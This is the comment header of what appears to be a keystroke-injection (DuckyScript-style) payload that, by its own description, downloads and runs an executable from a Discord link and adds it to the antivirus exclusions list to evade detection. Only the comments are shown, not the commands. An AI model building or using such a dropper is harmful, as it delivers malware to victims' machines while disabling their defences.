REM Author: Quessts
REM The following script downloads and runs
REM executable files from the internet
REM replace <File Name> with the name of the exe
REM and replace <Download Link> with the URL link
REM I recommend uploading the exe to discord and
REM getting the URL from there. Also Make sure that
REM the name of the exe doesn't exceed 5 characters
REM this script also bypasses AntiVirus and
REM adds the file to the exclusions list
REM please give credit when sharing this script
REM and don't use it for evil :)
